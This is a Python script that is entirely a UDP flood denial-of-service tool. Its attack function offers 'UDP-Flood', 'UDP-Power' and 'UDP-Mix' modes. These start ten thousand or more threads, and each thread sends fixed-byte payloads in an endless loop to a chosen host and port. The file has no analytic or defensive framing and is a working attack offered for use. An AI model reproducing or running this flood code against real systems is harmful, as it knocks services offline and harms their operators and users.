import socket
import threading

loops = 10000

def send_packet(host, port, amplifier):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((str(host), int(port)))
        while True:
            s.send(b"\x99" * amplifier)
    except:
        s.close()

def attack(host, port, method):
    if method == "UDP-Flood":
        for _ in range(loops):
            threading.Thread(
                target=send_packet,
                args=(host, port, 375),
                daemon=True
            ).start()

    elif method == "UDP-Power":
        for _ in range(loops):
            threading.Thread(
                target=send_packet,
                args=(host, port, 750),
                daemon=True
            ).start()

    elif method == "UDP-Mix":
        for _ in range(loops):
            threading.Thread(
                target=send_packet,
                args=(host, port, 375),
                daemon=True
            ).start()
            threading.Thread(
                target=send_packet,
                args=(host, port, 750),
                daemon=True
            ).start()